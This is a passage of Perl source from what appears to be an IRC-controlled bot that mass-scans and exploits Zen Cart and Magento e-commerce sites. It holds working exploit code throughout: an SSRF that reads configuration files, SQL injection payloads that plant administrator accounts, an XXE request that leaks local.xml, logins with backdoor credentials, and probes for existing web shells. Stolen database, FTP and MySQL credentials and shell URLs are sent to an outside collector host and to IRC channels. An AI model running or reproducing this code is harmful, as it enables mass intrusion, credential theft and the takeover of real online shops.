	my @list = &search_engine($chan,$bug,$dork,$engine,$zenlogo);
	my $num = scalar(@list);
	if ($num > 0){
		foreach my $site(@list){
		$count++;
		if ($count == $num-1) { &msg("$chan","$zenlogo 4$engine 0 Selesai"); }
            my $test2 = "http://".$site.$zenshell_test;
            my $vuln2 = "http://".$site."/images/jrk.php";
			my $zctest = "http://".$site.$bug;
            my $re2 = &get_content($test2);
			my $zhtml  = &get_content($zctest);
			if ($zchtml =~ /zc_install/){
			&zen_query($chan,$site,$zctest,$engine);}
            if ($re2 =~ /GIF89/){
			&get_content("".$botsaver."?x=-SHELL- ".$vuln2."");
            &msg("$admin", "$zenlogo(4@8$engine15)(4@13VulN15)13 ".$vuln2."15");}
            my $test  = "http://".$site."extras/curltest.php";
            my $vuln  = "http://".$site."extras/ipn_test_return.php";
             my $html  = &get_content($test);
                if ($html =~ /Zen Cart/){
                my $target  = &get_content($vuln);
                if ($target =~ /failed to open stream/){
                my $dir   ="";
                if ($target =~ m/in <b>(.*?)\/extras\/ipn_test_return.php<\/b>/) {$dir = $1;}
                &msg("$chan","$zenlogo(http://".$site." [+]Direktori:  $dir");
            my $data  = "http://".$site."/extras/curltest.php?url=file:///".$dir."/includes/configure.php";
            my $sql  = &get_content($data);
        if ($sql =~/DB_SERVER/i )
        {
            if ($sql =~ m/'DB_SERVER', '(.*)'/g) {$dbserver=$1;}
            if ($sql =~ m/'DB_SERVER_USERNAME', '(.*)'/g) {$dbuser=$1;}
            if ($sql =~ m/'DB_SERVER_PASSWORD', '(.*)'/g) {$dbpassword=$1;}
            if ($sql =~ m/'DB_DATABASE', '(.*)'/g) {$dbname=$1;}
			&get_content("".$botsaver."?x=-DATABASE- http://".$site." - Dir:".$dir." - Hostname:".$dbserver." - Username:".$dbuser." - Password:".$dbpassword." - DBName:".$dbname."");
            &msg("$chan","2$zenlogo2 11[+]Database[+]11 6http://".$site."6 11[+]dir:11 6".$dir."6 11[+]hostname:11 6".$dbserver."6 11[+]username:11 6".$dbuser."6 11[+]password:11 6".$dbpassword."6 11[+]dbname:11 6".$dbname."6 ");
            &msg("$admin","2$zenlogo2 11[+]Database[+]11 6http://".$site."6 11[+]dir:11 6".$dir."6 11[+]hostname:11 6".$dbserver."6 11[+]username:11 6".$dbuser."6 11[+]password:11 6".$dbpassword."6 11[+]dbname:11 6".$dbname."6");
			}
        
        my $check = &get_content("http://".$site."phpmyadmin");
            if ($check =~ /phpMyAdmin/) {
			&get_content("".$botsaver."?x=-PHPMYADMIN- http://".$site."phpmyadmin");
            &msg("$chan","2$zenlogo2(13 Phpmyadmin 13   12http://".$site."phpmyadmin 12");}
        if ($dbuser =~ /_/) {@users = split("_", $dbuser); $usr = $users[0];}
            my $ceklog = "".$ftpxpl."?host=".$site."&user=".$usr."&pass=".$pass."";
            my $ceklog2 = "".$ftpxpl."?host=".$site."&user=".$dbuser."&pass=".$dbpassword."";
            my $ftplog = &get_content($ceklog);
            my $ftplog2 = &get_content($ceklog2);
                if ($ftplog =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$usr." - Password:".$dbpassword."");
                    &msg("$admin","2$zenlogo2[+]FTP[+]5 ftp://".$site." [+]username:".$usr." [+]password:".$dbpassword."5");
                }
                if ($ftplog2 =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$dbuser." - Password:".$dbpassword."");
                    &msg("$admin","$zenlogo13[+]FTP[+] 5ftp://".$site." [+]username:".$dbuser." [+]password:".$dbpassword."5");
                }
            my $port = "3306";
            my $platform = "mysql";
            my $dsn = "dbi:$platform:$dbname:$site:$port";
            my $DBIconnect=  DBI->connect($dsn,$dbuser,$dbpassword);
        if ($DBIconnect) {
		&get_content("".$botsaver."?x=-MYSQL- http://".$site." - Hostname:".$dbserver." - Username:".$dbuser." - Password:".$dbpassword." - DBName:".$dbname."");
        &msg("$chan","2$zenlogo2[+]MYSQL[+] 13[ 9http://".$site." [+]hostname:".$dbserver." [+]username:".$dbuser." [+]password:".$dbpassword." [+]dbname:".$dbname."  13] [4 Connected 4 13]");
        &msg("$admin","2$zenlogo2[+]MYSQL[+] 13[ 9http://".$site." [+]hostname:".$dbserver." [+]username:".$dbuser." [+]password:".$dbpassword." [+]dbname:".$dbname."  13] [4 Connected 4 13]");
		}
            my $dsn2 = "dbi:$platform:$dbname:$dbserver:$port";
            my $DBIconnect2=  DBI->connect($dsn2,$dbuser,$dbpassword);
        if ($DBIconnect2) {
		&get_content("".$botsaver."?x=-MYSQL- http://".$site." - Hostname:".$dbserver." - Username:".$dbuser." - Password:".$dbpassword." - DBName:".$dbname."");
        &msg("$chan","2$zenlogo2[+]MYSQL[+] 13[ 9http://".$site." [+]hostname:".$dbserver." [+]username:".$dbuser." [+]password:".$dbpassword." [+]dbname:".$dbname."  13] [4 Connected 4 13]");
        &msg("$admin","2$zenlogo2[+]MYSQL[+] 13[ 9http://".$site." [+]hostname:".$dbserver." [+]username:".$dbuser." [+]password:".$dbpassword." [+]dbname:".$dbname."  13] [4 Connected 4 13]");
		}
        
         if ($userrev =~ /_/) {@users = split("_", $dbuser); $usr = $users[0];}    
			my $ceklog = "ftp://".$usr.":".$dbpassword."@".$site."";
            my $ceklog2 = "ftp://".$dbuser.":".$dbpassword."@".$site."";
            my $ftplog = &get_content($ceklog);
            my $ftplog2 = &get_content($ceklog2);
                if ($ftplog =~ /ftp/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$usr." - Password:".$dbpassword." / cPanel: ".$site."".$usr."".$dbpassword."/cpanel ");
                    &msg("$admin","8[+]FTP[+] ftp://".$site." [+]username:".$usr." [+]password:".$dbpassword." / [+]cpanel: ".$site."".$usr."".$dbpassword."/cpanel ");
					}
                if ($ftplog2 =~ /ftp/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$dbuser." - Password:".$dbpassword." / cPanel: ".$site."".$usr."".$dbpassword."/cpanel ");
                    &msg("$admin","8[+]FTP[+] ftp://".$site." [+]username:".$dbuser." [+]password:".$dbpassword." [+]cpanel: ".$site."".$dbuser."".$dbpassword."/cpanel ");
					}
                }
            }
        }
    }
}

sub zen_query() {
	my $chan = $_[0];
	my $url = $_[1];
	my $test = $_[2];
	my $engine = $_[3];
	my $code  = "INSERT+INTO+admin+%28admin_id%2C+admin_name%2C+admin_email%2C+admin_pass%29+VALUES+%2856%2C%27adminsys%27%2C%27admin%40mazacrew.co.cc%27%2C%27617ec22fbb8f201c366e9848c0eb6925%3A87%27%29%3B";
	my $req = HTTP::Request->new(POST => $test);
	$req->content_type("application/x-www-form-urlencoded");
	$req->content("query_string=".$code);
	my $ua = LWP::UserAgent->new(agent => $uagent);
	$ua->timeout(3);
	my $res = $ua->request($req);
	my $data = $res->as_string;
	if ( $data =~ /1 statements processed/i ) {
		&get_content("".$botsaver."?x=-VULN- http://".$url."admin/login.php");
		&msg("$chan","$zenlogo15$engine 4<9=4>15 VulN 4<9=4>9 http://".$url."admin/login.php ");
		&msg("$admin","$zenlogo15$engine 4<9=4>15 VulN 4<9=4>9 http://".$url."admin/login.php ");
	}
	elsif ( $data =~ /Duplicate entry/i ) { 
		&get_content("".$botsaver."?x=-LOGIN- http://".$url."admin/login.php");
		&msg("$chan","$zenlogo15$engine 4<9=4>9 SuccesS 4<9=4>9 http://".$url."admin/login.php )");
		&msg("$admin","$zenlogo15$engine 4<9=4>9 SuccesS 4<9=4>9 http://".$url."admin/login.php ");
	}
}

sub shoplift() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$magelogo);
	    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$magelogo14(4$engine14)3 Finished..."); }
		my $test = "".$shopliftxpl."?target=http://".$site."&type=shoplift";
        my $htmlx = &get_content($test);
		my $testsql = "http://".$site."admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzU7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDM1OyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzUsJ2JhY2t1cCcsICdzeXN0ZW0zMicsICdiYWNrdXBAbWFnZW50b3MuY29tJywgJ3N5c3RlbTMyJywgJzhjNjBlZDlhMjEwZDBlZTlkNDkzYjM4ZTE0MWFlZWUzJywgJ251bGwnLCAnbnVsbCcsICdudWxsJywgMSwgMCwgMSwgJ047Jyk7ICBJTlNFUlQgSU5UTyBgYWRtaW5fcm9sZWAgKGBwYXJlbnRfaWRgLCBgdHJlZV9sZXZlbGAsIGBzb3J0X29yZGVyYCwgYHJvbGVfdHlwZWAsIGB1c2VyX2lkYCwgYHJvbGVfbmFtZWApIFZBTFVFUyAoMSwgMiwgMCwgJ1UnLCAzNSwgJ21hZ2VudCcpOzsgLS0g";
		&get_content($testsql);
		if ($htmlx =~ /is vulnerable/) {
		my $htmlsql = &get_content($testsql);}
		my $downloader = "http://".$site."/downloader/?return=http%3A%2F%2F".$site."%2Findex.php%2Fadmin%2F";
    	my $ngecek = &get_content($downloader);
    	if ($ngecek =~ /Magento Downloader/) {		
		my ($useragent,$request,$response,%form);
		undef %form;
		$form{username}  = "system32";
		$form{password}  = "devil123";
		$useragent = LWP::UserAgent->new(agent => $uagent);
		$useragent->timeout(20);
		$request   = POST $downloader,\%form;
		$response  = $useragent->request($request);
		if ($response->is_success) {
		my $res = $response->content;
		if ($res =~ /Upload package file/) {
		&get_content("".$botsaver."?x=[ShopLift] http://".$site."index.php/admin - Login Success");
		&msg("$chan","99[ShopLift] http://".$site."index.php/admin - 13Login Success");
		&msg("$admin","$magelogo(13,1$engine13) 9http://".$site."index.php/admin 9- 13Login Success");}
		if ($res =~ /Warning: (.*)<\/h4/ ) {
		if ($res =~ /Warning: (.*)<\/h4/ ) {$warn=$1;}
		&get_content("".$botsaver."?x=[ShopLift] http://".$site." - ".$warn."");
		&msg("$chan","99[ShopLift] http://".$site." -4 $warn");
		&msg("$admin","$magelogo(13,1$engine13) 9http://".$site." 9-4 $warn");}
		if($res =~ /Invalid/) {
		my $dirk = "admin";
		&chkbegal($site,$dirk,$chan,$engine);}}}
		my $test1x = "http://".$site."skin/error.php";
		my $test2x = "http://".$site."skin/upil.php";
		my $test3x = "http://".$site."skin/skinmain.php";
		my $test4x = "http://".$site."skin/rss.php";
		my $test5x = "http://".$site."skin/skinwizard.php";
		my $html1x = &get_content($test1x);
		if ($html1x =~ /post>Password:/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test1x."");
		&msg("$admin","$magelogo(13,1$engine13)8 ".$test1x."");}
		my $html2x = &get_content($test2x);#sleep(1);
		if ($html2x =~ /GIF89GHZ/) {
		if ($html2x =~ /<b><br><br>(.*)<br>/){$osx=$1;}
		&get_content("".$botsaver."?x=-SHELL- ".$test2x." (OS:".$osx.")");
		&msg("$admin","$magelogo(13,1$engine13)8 ".$test2x." 9".$osx."");}
		my $html3x = &get_content($test3x);
		if ($html3x =~ /post>Password:/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test3x."");
		&msg("$admin","$magelogo(13,1$engine13)8 ".$test3x."");}
		my $html4x = &get_content($test4x);#sleep(1);
		if ($html4x =~ /GIF89a/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test4x."");
		&msg("$admin","$magelogo(13,1$engine13)8 ".$test4x."");}
		my $html5x = &get_content($test5x);
		if ($html5x =~ /post>Password:/) {
		&get_content("".$botsaver."?x=-SHELL- ".$test5x."");
		&msg("$admin","$magelogo(13,1$engine13)8 ".$test5x."");}
		}
	}
}

sub magadmin() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$magelogo);
	    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$magelogo14(4$engine14)3 Finished..."); }
            my $test = "".$shopliftxpl."?target=http://".$site."&type=shoplift";
			my $test1 = "http://".$site."app/etc/local.xml";
			my $test2 = "http://".$site."api/xmlrpc";			
			my $injek = "http://".$site."index.php/admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzU7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDM1OyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzUsJ2JhY2t1cCcsICdzeXN0ZW0zMicsICdiYWNrdXBAbWFnZW50b3MuY29tJywgJ3N5c3RlbTMyJywgJzhjNjBlZDlhMjEwZDBlZTlkNDkzYjM4ZTE0MWFlZWUzJywgJ251bGwnLCAnbnVsbCcsICdudWxsJywgMSwgMCwgMSwgJ047Jyk7ICBJTlNFUlQgSU5UTyBgYWRtaW5fcm9sZWAgKGBwYXJlbnRfaWRgLCBgdHJlZV9sZXZlbGAsIGBzb3J0X29yZGVyYCwgYHJvbGVfdHlwZWAsIGB1c2VyX2lkYCwgYHJvbGVfbmFtZWApIFZBTFVFUyAoMSwgMiwgMCwgJ1UnLCAzNSwgJ21hZ2VudCcpOzsgLS0g";
			my $dirk = "admin";
			&get_content($test);
			&get_content($inject);
			&chkdownload($site,$dirk,$chan,$engine);
			my $html1 = &get_content($test1);
			if ($html1 =~ /<username><!\[CDATA\[(.*)\]\]\><\/username>/ ) {
			if ($html1 =~ /<frontName><!\[CDATA\[(.*)\]\]\><\/frontName>/){$dirs=$1;}
			if ($html1 =~ /<table_prefix><!\[CDATA\[(.*)\]\]\><\/table_prefix>/){$prefixs=$1;}
			my $injek1 = "http://".$site."index.php/".$dirs."/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzU7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDM1OyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzUsJ2JhY2t1cCcsICdzeXN0ZW0zMicsICdiYWNrdXBAbWFnZW50b3MuY29tJywgJ3N5c3RlbTMyJywgJzhjNjBlZDlhMjEwZDBlZTlkNDkzYjM4ZTE0MWFlZWUzJywgJ251bGwnLCAnbnVsbCcsICdudWxsJywgMSwgMCwgMSwgJ047Jyk7ICBJTlNFUlQgSU5UTyBgYWRtaW5fcm9sZWAgKGBwYXJlbnRfaWRgLCBgdHJlZV9sZXZlbGAsIGBzb3J0X29yZGVyYCwgYHJvbGVfdHlwZWAsIGB1c2VyX2lkYCwgYHJvbGVfbmFtZWApIFZBTFVFUyAoMSwgMiwgMCwgJ1UnLCAzNSwgJ21hZ2VudCcpOzsgLS0g";
			&msg("$chan","(4@3VULN)14 ".$test1."");
			&msg("$chan","(4@3VULN)15 http://".$site." 14[+]prefix:4 ".$prefixs."");
			&msg("$chan","(4@3VULN)15 http://".$site." 14[+]panel:4 ".$dirs."");
			my $execute1 = &get_content($injek1);
			&chkdownload($site,$dirs,$chan,$engine); }
			my $html2 = &get_content($test2);
			if ($html2 =~ /faultString/i ) {
			my $exl = &xxe_query($test2);
			if ($exl =~ m/PD94(.*)/){
			my $data = $1;
			my $hash = decode_base64($data);
			if ($hash =~ /<frontName><!\[CDATA\[(.*)\]\]\><\/frontName>/){$dir=$1;}
			if ($hash =~ /<table_prefix><!\[CDATA\[(.*)\]\]\><\/table_prefix>/){$prefix=$1;}
			my $injek2 = "http://".$site."index.php/".$dir."/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzU7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDM1OyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzUsJ2JhY2t1cCcsICdzeXN0ZW0zMicsICdiYWNrdXBAbWFnZW50b3MuY29tJywgJ3N5c3RlbTMyJywgJzhjNjBlZDlhMjEwZDBlZTlkNDkzYjM4ZTE0MWFlZWUzJywgJ251bGwnLCAnbnVsbCcsICdudWxsJywgMSwgMCwgMSwgJ047Jyk7ICBJTlNFUlQgSU5UTyBgYWRtaW5fcm9sZWAgKGBwYXJlbnRfaWRgLCBgdHJlZV9sZXZlbGAsIGBzb3J0X29yZGVyYCwgYHJvbGVfdHlwZWAsIGB1c2VyX2lkYCwgYHJvbGVfbmFtZWApIFZBTFVFUyAoMSwgMiwgMCwgJ1UnLCAzNSwgJ21hZ2VudCcpOzsgLS0g";
			my $execute2 = &get_content($injek2);
			&chkdownload($site,$dir,$chan,$engine);}}
			my $test1x = "http://".$site."skin/error.php";
			my $test2x = "http://".$site."skin/upil.php";
			my $test3x = "http://".$site."skin/skinmain.php";
			my $test4x = "http://".$site."skin/rss.php";
			my $test5x = "http://".$site."skin/skinwizard.php";
			my $html1x = &get_content($test1x);
			if ($html1x =~ /post>Password:/) {
			&get_content("".$botsaver."?x=-SHELL- ".$test1x."");
			&msg("$admin","$magelogo(13,1$engine13)8 ".$test1x."");}
			my $html2x = &get_content($test2x);#sleep(1);
			if ($html2x =~ /GIF89GHZ/) {
			if ($html2x =~ /<b><br><br>(.*)<br>/){$osx=$1;}
			&get_content("".$botsaver."?x=-SHELL- ".$test2x." (OS:".$osx.")");
			&msg("$admin","$magelogo(13,1$engine13)8 ".$test2x." 9".$osx."");}
			my $html3x = &get_content($test3x);
			if ($html3x =~ /post>Password:/) {
			&get_content("".$botsaver."?x=-SHELL- ".$test3x."");
			&msg("$admin","$magelogo(13,1$engine13)8 ".$test3x."");}
			my $html4x = &get_content($test4x);#sleep(1);
			if ($html4x =~ /GIF89a/) {
			&get_content("".$botsaver."?x=-SHELL- ".$test4x."");
			&msg("$admin","$magelogo(13,1$engine13)8 ".$test4x."");}
			my $html5x = &get_content($test5x);
			if ($html5x =~ /post>Password:/) {
			&get_content("".$botsaver."?x=-SHELL- ".$test5x."");
			&msg("$admin","$magelogo(13,1$engine13)8 ".$test5x."");}
}}}

sub chkdownload {
my $site = $_[0];
my $dirr = $_[1];
my $chan = $_[2];
my $engine = $_[3];
		my $website = "http://".$site."downloader/";
		my $wbst = "http://".$site."downloader/index.php?A=settings";
		my $check = &get_content($website);
 			if ($check =~ /Magento Downloader/) { 					
 			my ($useragent,$request,$response,%form);
 			undef %form;
 			$form{username}  = "system32";
 			$form{password}  = "devil123";
 			$useragent = LWP::UserAgent->new(agent => $uagent);
 			$useragent->timeout(10);
 			$request   = POST $website,\%form;
 			$response  = $useragent->request($request);
 			if ($response->is_success) {				
 			my $res = $response->content;
		if ($res =~ /Upload package file/ ) {
		&get_content("".$botsaver."?x=-SHOPLIFT- http://".$site."index.php/".$dirr."/ - Login Success");
		&msg("$chan","99[ShopLift] http://".$site."index.php/".$dirr."/ - 13Login Success");
		&msg("$admin","$magelogo(13,1$engine13) 9http://".$site."index.php/".$dirr."/ 9- 13Login Success");}
		if ($res =~ /Warning: (.*)<\/h4/ ) {
		if ($res =~ /Warning: (.*)<\/h4/ ) {$warn=$1;}
		&get_content("".$botsaver."?x=-SHOPLIFT- http://".$site." - ".$warn."");
		&msg("$chan","99[ShopLift] http://".$site." -4 $warn");
		&msg("$admin","$magelogo(13,1$engine13) 9http://".$site." 9-4 $warn");}
		if($res =~ /Invalid/) {
		&chkbegal($site,$dirr,$chan,$engine);}
}}}

sub chkbegal {
my $site = $_[0];
my $dirr = $_[1];
my $chan = $_[2];
my $engine = $_[3];
		my $website = "http://".$site."downloader/";
		my $wbst = "http://".$site."downloader/index.php?A=settings";
		my $check = &get_content($website);
 			if ($check =~ /Magento Downloader/) { 					
 			my ($useragent,$request,$response,%form);
 			undef %form;
 			$form{username}  = "xSouL";
 			$form{password}  = "gentho";
 			$useragent = LWP::UserAgent->new(agent => $uagent);
 			$useragent->timeout(10);
 			$request   = POST $website,\%form;
 			$response  = $useragent->request($request);
 			if ($response->is_success) {				
 			my $res = $response->content;
		if ($res =~ /Upload package file/ ) {
		&get_content("".$botsaver."?x=-SHOPLIFT- http://".$site."index.php/".$dirr."/ - Login Success xSouL Kontol");
		&msg("$chan","99[ShopLift] http://".$site."index.php/".$dirr."/ - 13Login Success xSouL Kontol");
		&msg("$admin","$magelogo(13,1$engine13) 9http://".$site."index.php/".$dirr."/ 9- 13Login Success xSouL Kontol");}
		if ($res =~ /Warning: (.*)<\/h4/ ) {
		if ($res =~ /Warning: (.*)<\/h4/ ) {$warn=$1;}
		&get_content("".$botsaver."?x=-SHOPLIFT- http://".$site." - ".$warn."");
		&msg("$chan","99[ShopLift] http://".$site." -4 $warn");
		&msg("$admin","$magelogo(13,1$engine13) 9http://".$site." 9-4 $warn");}
}}}

sub magsql() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$magelogo);
	    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$magelogo14(4$engine14)3 Finished..."); }
		my $test = "http://".$site."/app/etc/local.xml";
            my $test2 = "http://".$site."phpmyadmin";    
            my $html = &get_content($test);
        if ($html =~ /dbname/i ) 
        {
            if ($html =~ /<key><!\[\CDATA\[(.*)\]\]\><\/key>/) {$key=$1;}
            if ($html =~ /<host><!\[\CDATA\[(.*)\]\]\><\/host>/) {$serverIP=$1;}
            if ($html =~ /<username><!\[CDATA\[(.*)\]\]\><\/username>/){$user=$1;}
            if ($html =~ /<password><!\[CDATA\[(.*)\]\]\><\/password>/){$pass=$1;}
            if ($html =~ /<dbname><!\[CDATA\[(.*)\]\]\><\/dbname>/){$dbname=$1;}
            if ($html =~ /<frontName><!\[CDATA\[(.*)\]\]\><\/frontName>/){$adminpage=$1;}
            my $check = &get_content("http://".$site."phpmyadmin");
            if ($check =~ /phpMyAdmin/) {
			&get_content("".$botsaver."?x=-PHPMYADMIN- http://".$site."phpmyadmin");
            &msg("$admin","$magelogo13 Hacked 13(4@13phpMyAdmin)  http://".$site."phpmyadmin");}
            my $checker = &get_content("http://".$site."phpinfo.php");
            if ($checker =~ /DOCUMENT_ROOT/) {
			&get_content("".$botsaver."?x=-PHPINFO- http://".$site."phpinfo.php");
            &msg("$admin","$magelogo13 Hacked 13(4@13Info)  http://".$site."phpinfo.php");}
            my $checkerz = &get_content("http://".$site."info.php");
            if ($checkerz =~ /DOCUMENT_ROOT/) {
			&get_content("".$botsaver."?x=-PHPINFO- http://".$site."info.php");
            &msg("$admin","$magelogo13 Hacked 7(4@7Info)  http://".$site."info.php");}
			&get_content("".$botsaver."?x=-DATABASE- http://".$site." - Hostname: ".$serverIP." - Username: ".$user." - Password: ".$pass." - DBName: ".$dbname." - Panel: ".$adminpage." [+]key: ".$key."");
            &msg("$chan","4$magelogo4 6[+]Database[+]6 11http://".$site."11 6[+]hostname:6 11".$serverIP."11 6[+]username:6 11".$user."11 6[+]password:6 11".$pass."11 6[+]dbname:6 11".$dbname."11 6[+]admipage:6 11".$adminpage."11 6[+]key:6 11".$key."11");
            &msg("$admin","4$magelogo4 6[+]Database[+]6 11http://".$site."11 6[+]hostname:6 11".$serverIP."11 6[+]username:6 11".$user."11 6[+]password:6 11".$pass."11 6[+]dbname:6 11".$dbname."11 6[+]admipage:6 11".$adminpage."11 6[+]key:6 11".$key."11");
            if ($user =~ /_/) {@users = split("_", $user); $usr = $users[0];}
            my $ceklog = "".$ftpxpl."?host=".$site."&user=".$usr."&pass=".$pass."";
            my $ceklog2 = "".$ftpxpl."?host=".$site."&user=".$user."&pass=".$pass."";
            my $ftplog = &get_content($ceklog);
            my $ftplog2 = &get_content($ceklog2);
                if ($ftplog =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$usr." - Password:".$pass."");
                    &msg("$admin","$magelogo13[+]FTP[+] ftp://".$site." [+]username:".$usr." [+]password:".$pass."");
                }
                if ($ftplog2 =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$user." - Password:".$pass."");
                    &msg("$admin"," $magelogo13[+]FTP[+] ftp://".$site." [+]username:".$user." [+]password:".$pass."");
                }
            my $port = "3306";
            my $platform = "mysql";
            my $dsn = "dbi:$platform:$dbname:$site:$port";
            my $DBIconnect=  DBI->connect($dsn,$user,$pass);
        if ($DBIconnect) {
		&get_content("".$botsaver."?x=-MYSQL- http://".$site." - Hostname:".$serverIP." - Username:".$user." - Password:".$pass." - DBName:".$dbname."");
        &msg("$chan","$magelogo6[+]MYSQL[+] 6[ 6http://".$site." [+]hostname:".$serverIP." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."  6] [4 Connected 4]");
        &msg("$admin","$magelogo6[+]MYSQL[+] 6[ 6http://".$site." [+]hostname:".$serverIP." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."  6] [4 Connected 4]");
    }
            my $dsn2 = "dbi:$platform:$dbname:$serverIP:$port";
            my $DBIconnect2 = DBI->connect($dsn2,$user,$pass);
        if ($DBIconnect2) {
		&get_content("".$botsaver."?x=-MYSQL- http://".$site." - Hostname:".$serverIP." - Username:".$user." - Password:".$pass." - DBName:".$dbname."");
        &msg("$chan","$magelogo6[+]MYSQL[+] 6[ 6http://".$site." [+]hostname:".$serverIP." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."  6] [4 Connected 4]");
        &msg("$admin","$magelogo6[+]MYSQL[+] 6[ 6http://".$site." [+]hostname:".$serverIP." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."  6] [4 Connected 4]");
    	}
    }
	}
	} 
 }

sub xxe_query() {
  my $jembut = $_[0];
  my $userAgent = LWP::UserAgent->new(agent => 'perl post');
          $b = "<?xml version=\"1.0\"?>";
          $b .= "<!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=app/etc/local.xml\"> ]>";
          $b .= "<methodCall><methodName>&xxe;</methodName></methodCall>";
  my $response = $userAgent->request(POST $jembut , Content_Type => 'text/xml', Content => $b);
  return $response->content;
}

sub magelfi() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$magelogo);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$chan","$magelogo 4$engine 0 Selesai"); }
